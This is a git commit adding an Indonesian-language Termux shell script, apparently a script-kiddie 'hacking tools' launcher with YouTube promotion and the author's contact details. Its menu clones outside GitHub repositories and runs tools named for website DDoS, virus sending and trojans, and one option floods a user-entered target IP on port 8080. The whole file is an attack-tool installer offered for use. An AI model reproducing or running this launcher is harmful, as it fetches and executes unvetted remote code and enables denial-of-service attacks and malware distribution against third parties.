a9cb7baed6b5e011fca0c0db7a66ae0c60e4d936
Mr.K1LL-MUFTI- <59869552+Mufti05@users.noreply.github.com>
2020-02-23 04:52:56 +0700

    Add files via upload

---
+++ Tools.sh
@@ -0,0 +1,114 @@
+#!bin/sh
+biru='\033[34;1m'
+hijau='\033[32;1m'
+ungu='\033[35;1m'
+cyan='\033[36;1m'
+merah='\033[31;1m'
+putih='\033[37;m'
+kuning='\033[33;m'
+clear
+echo $merah"Selamat Datang Bosque Di Tools SQuen"
+sleep 1
+echo $kuning"Jangan Lupa Subscribe Channel L.O.S Army"
+sleep 1
+echo $hijau"Copy Link Di Bawah Ini Untuk Masuk Ke Akun Youtube Author"
+sleep 1
+echo $merah"Jangan Lupa Di Subscribe Mungkin Ada Video Yang Bermanfaat"
+sleep 1
+echo $kuning"http://bit.ly/YtMufti"
+sleep 4
+echo $hijau"Memulai Menginstall Tools SQuen"
+pkg update && pkg upgrade
+pkg install python
+pkg install php
+pkg install bash
+pkg install toilet
+pkg install figlet
+pkg install screenfetch
+pkg install nodejs
+pkg install lolcat
+gem install lolcat
+pkg install pip
+pip2 install requests
+pip2 install mechanize
+pip2 install tqdm
+clear
+echo $cyan"Dahulukan Membaca Basmalah"
+toilet -f big -F gay Mufti
+echo "YouTube : L.O.S Army - Mufti05" | lolcat
+echo "Facebook : Ikhwan Mufti Muhammad" | lolcat
+echo "WhatsApp : +62 896 0244 9623" | lolcat
+echo "-----------+++++-----------" | lolcat
+echo "[1]Install Ddos_Website"
+echo "---------------------------" | lolcat
+echo "[2]Install Kirim_Virus"
+echo "---------------------------" | lolcat
+echo "[3]Install Lite_Ddos"
+echo "---------------------------" | lolcat
+echo "[4]Install Trojan_Mania"
+echo "---------------------------" | lolcat
+echo "[5]Install Bonus_Tools"
+echo "-----------+++++-----------" | lolcat
+sleep 1
+echo $hijau"Jika Anda Memiliki Code Rahasia Masukkan Di Bawah"
+read -p "Siapa Nama Anda: " nm
+echo $cyan"Terimakasih $nm Sudah Bergabung"
+read -p "Masukkan Pilihan Anda $nm: " pl
+echo $hijau"Jangan Lupa Subscribe Channel Author"
+if [ $pl = 1 ]
+then
+    echo " By Mufti"
+    cowsay Jangan Lupa Subscribe
+    figlet Mufti
+    echo $merah"Menginstall Tools Ddos_Website"
+    pkg install python python2
+    git clone https://github.com/Mufti05/serang
+    cd serang
+    sh serang.sh
+fi
+if [ $pl = 5 ]
+then
+    cowsay Hanya Hiburan
+    screenfetch -A "Debian"
+    screenfetch
+    screenfetch -A "linux"
+    screenfetch
+    toilet -f big -F gay Hanya
+    figlet Hiburan
+    echo "Nomer Lima Ini Hanyalah Hiburan Semata" | lolcat
+    echo "Tidak Ada Isi Script Di Nomer 5 Ini" | lolcat
+    echo "Kecuali Di Code Rahasia Yang Anda Masukkan" | lolcat
+fi
+if [ $pl = 3 ]
+then
+    echo " By Mufti"
+    cowsay jangan lupa subscribe
+    echo $merah"Menginstall Tools Lite_Ddos"
+    read -p "Masukkan IP target: " ip
+    pkg install python python2              
+    git clone https://github.com/4L13199/LITEDDOS
+    cd LITEDDOS
+    python2 LITEDDOS.py $ip 8080 1000
+fi
+if [ $pl = 4 ]
+then
+    echo " By Mufti"
+    cowsay Jangan Lupa Subscribe
+    echo $merah"Menginstall Tools Trojan_Mania"
+    pkg install python python2
+    git clone https://github.com/IntiTutorial/Trojans
+    cd Trojans
+    python2 trojans.py
+              
+fi
+if [ $pl = 2 ]
+then
+    echo " By Mufti"
+    cowsay Jangan Lupa subscribe
+    echo $merah"Menginstall Tools Virus_Bahaya"
+    pkg install python python2
+    git clone https://github.com/IntiTutorial/B-VIRUS
+    cd B-VIRUS
+    python2 B-VIRUS.py
+fi
+echo "Terimakasih Sudah Menggunakan Script By Mufti Ini" | lolcat
